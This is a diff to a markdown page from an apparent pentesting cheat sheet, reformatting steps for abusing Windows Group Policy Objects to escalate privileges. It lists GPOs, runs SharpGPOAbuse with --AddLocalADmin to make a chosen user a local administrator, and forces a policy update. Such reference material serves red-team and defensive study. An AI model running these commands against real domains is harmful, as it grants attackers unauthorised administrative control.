@@ -7,24 +7,36 @@ tags: ["GPOs", "Windows", "privesc", "Group Policy Objects"]
 ---
 ### Abuse #1: Add local admin
 
-[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)
-
 #### 1. List GPOs Name
+
+<div>
 
 ```powershell
 Get-GPO -All | Select-Object DisplayName
 ```
 
+</div>
+
 #### 2. Add localAdmin
+
+<div>
 
 ```powershell
 .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount <USER> --GPOName <GPO_NAME>
 ```
 
+</div>
+
 #### 3. Force reload
+
+<div>
 
 ```powershell
 gpupdate /force
 ```
+
+</div>
+
+<small>*Ref: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)*</small>
 
 <br>
